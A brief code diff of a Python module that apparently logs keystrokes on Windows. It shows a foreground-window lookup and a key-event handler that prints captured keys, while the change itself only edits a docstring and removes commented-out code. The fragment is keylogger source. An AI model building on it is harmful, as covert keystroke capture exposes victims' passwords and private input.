@@ -18,7 +18,8 @@ def get_str_value(psapi_obj):
 
 def get_current_process():
     '''
-    Returns current process information as a string with PID, executable, title
+    Returns current process information as a string with PID, executable, and
+    title
     '''
     # Get a handle to the foreground window
     hwnd = user32.GetForegoundWindow()
@@ -72,11 +73,6 @@ def KeyStroke(event):
             print('{key}'.format(key=event.Key), end='', flush=True)
     except Exception:
         pass
-    # if (time.gmtime() - previous_time) > 7:
-    #     previous_time = time.gmtime()
-    #     return previous_time
-    # else:
-    #     return True
 
 
 def run(**args):
